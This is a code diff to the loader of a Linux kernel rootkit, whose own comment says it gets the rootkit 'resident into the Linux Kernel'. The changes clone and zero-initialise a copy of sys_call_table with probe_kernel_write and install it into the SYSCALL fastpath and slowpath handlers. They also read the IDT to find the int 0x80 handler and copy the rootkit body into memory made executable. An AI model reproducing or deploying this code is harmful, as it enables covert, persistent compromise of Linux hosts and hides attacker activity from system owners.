@@ -21,6 +21,7 @@
 /*
  * This is the loader. Will get the RootKit Kernel resident into the Linux Kernel.
  */
+#include <asm/desc.h>
 #include <linux/net.h>
 #include <asm/cpu_entry_area.h>
 #include <asm/msr.h>
@@ -92,7 +93,8 @@ int init_module(void)
 {
 	size_t kernel_len = 0, kernel_paglen = 0, kernel_pages = 0, my_sct_len = 0;
 	void *kernel_addr = NULL, *tmp = NULL;
-	int addr = 0, ret = 0;
+	long addr = 0;
+	int ret = 0;
 
     kernel_len = &kernel_end - &kernel_start;
     kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
@@ -158,7 +160,9 @@ int init_module(void)
 	while(sys_call_table[my_sct_len]) {
 		my_sct_len ++;
 	}
-	my_sct = f__vmalloc_node_range(PAGE_ROUND_UP(my_sct_len * sizeof(void *)), 1,
+	pinfo("sys_call_table len = %d\n", my_sct_len);
+
+	my_sct = f__vmalloc_node_range(PAGE_ROUND_UP(my_sct_len * sizeof(void *)), 2,
                     MODULES_VADDR,
                     MODULES_END, GFP_KERNEL,
                     PAGE_KERNEL, 0, NUMA_NO_NODE,
@@ -169,16 +173,33 @@ int init_module(void)
 		return 0;
 	}
 
+	// zero memory
+	size_t off;
+	char zero = 0;
+	for(off = 0; off < PAGE_SIZE * 2; off ++) {
+		ret = probe_kernel_write((void *)((long)my_sct + off), &zero, sizeof(char));
+		if (ret != 0) {
+			perr("Sorry, can't zero memory for our sct.\n");
+			return 0;
+		}
+	}
+	pinfo("my_sct zeroed!\n");
+
 	my_sct_len = 0;
 	while(sys_call_table[my_sct_len]) {
-		my_sct[my_sct_len] = sys_call_table[my_sct_len];
+		ret = probe_kernel_write(&my_sct[my_sct_len], &sys_call_table[my_sct_len], sizeof(long));
+		if (ret != 0) {
+			perr("Sorry, can't clone sys_call_table.\n");
+			return 0;
+		}
+		//my_sct[my_sct_len] = sys_call_table[my_sct_len];
 		my_sct_len ++;
 	}
 
 	pinfo("my_sct = %p, len = %d\n", my_sct, my_sct_len);
 
 	/*
-	 * Install the new sct.
+	 * Install the new sct into SYSCALL handler.
 	 */
 	pinfo("before psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);
 	addr = (int) my_sct;
@@ -192,6 +213,16 @@ int init_module(void)
 	}
 
 	pinfo("after psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);
+
+	/*
+	 * Install the new sct into int $0x80.
+	 */
+	struct desc_ptr idtr;
+	store_idt(&idtr);
+	pinfo("IDT address = %p, size = %d\n", idtr.address, idtr.size);
+	gate_desc *idt = (gate_desc *) idtr.address;
+	addr = (0xffffffffffffffff - (0 - (unsigned int)gate_offset(&idt[0x80])) + 1);
+	pinfo("int 0x80 handler address = %p\n", addr);
 
 	/*
 	addr = (int) sys_call_table;
@@ -252,8 +283,13 @@ int init_module(void)
 		ret = set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
 		pinfo("ret = %d\n", ret);
 		//pinfo("kernel_addr's pages are now executable.\n");
-
-		memcpy(kernel_addr, &kernel_start, kernel_len);
+		
+		ret = probe_kernel_write(kernel_addr, &kernel_start, kernel_len);
+		if (ret != 0) {
+			perr("Sorry, can't copy kernel to its place.\n");
+			return 0;
+		}
+		//memcpy(kernel_addr, &kernel_start, kernel_len);
 		//pinfo("kernel is now copied to kernel_addr.\n");
 		
 		//disassemble(kernel_addr + ((unsigned long)&kernel_code_start - (unsigned long)&kernel_start), ((unsigned long)&kernel_end - (unsigned long)&kernel_code_start));
